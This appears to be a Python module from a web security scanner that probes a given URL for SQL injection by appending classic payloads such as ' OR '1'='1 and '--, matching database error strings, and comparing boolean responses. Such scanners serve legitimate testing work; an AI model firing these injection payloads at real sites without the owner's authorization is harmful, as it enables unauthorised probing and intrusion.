import httpx
import asyncio

HEADERS = {
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36",
    "Accept": "*/*",
    "Connection": "keep-alive"
}

ERROR_PATTERNS = [
    "sql syntax",
    "mysql",
    "warning",
    "ora-",
    "syntax error",
    "unclosed quotation"
]

PAYLOADS = [
    "' OR '1'='1",
    "' OR '1'='2",
    "'--",
    "\" OR \"1\"=\"1"
]


async def fetch_with_retry(client, url):
    for i in range(2):
        try:
            return await client.get(url, headers=HEADERS)
        except Exception as e:
            if i == 1:
                raise
            await asyncio.sleep(1)


async def run_sqli_test(url: str):
    findings = []
    details = []

    try:
        async with httpx.AsyncClient(timeout=15) as client:

            # 🔹 Baseline request
            baseline_resp = await fetch_with_retry(client, url)
            baseline_text = baseline_resp.text.lower()

            true_resp = None
            false_resp = None

            for payload in PAYLOADS:
                test_url = f"{url}&test={payload}"  # safer than overriding existing param

                try:
                    resp = await fetch_with_retry(client, test_url)
                    text = resp.text.lower()

                    # 🔹 Error-based detection
                    for pattern in ERROR_PATTERNS:
                        if pattern in text:
                            findings.append(f"SQL error pattern detected with payload: {payload}")
                            break

                    # 🔹 Boolean-based detection
                    if payload == "' OR '1'='1":
                        true_resp = text

                    if payload == "' OR '1'='2":
                        false_resp = text

                except Exception as e:
                    details.append(f"Payload {payload} failed: {repr(e)}")

            # 🔹 Response comparison
            if true_resp and false_resp:
                if true_resp != false_resp:
                    findings.append("Possible SQL Injection (boolean-based response difference)")

        status = "FAIL" if findings else "PASS"

    except Exception as e:
        return {
            "test": "SQL_INJECTION",
            "status": "SKIPPED",
            "note": "Target blocked or not reachable",
            "error": repr(e)
        }

    return {
        "test": "SQL_INJECTION",
        "status": status,
        "findings": findings,
        "details": details
    }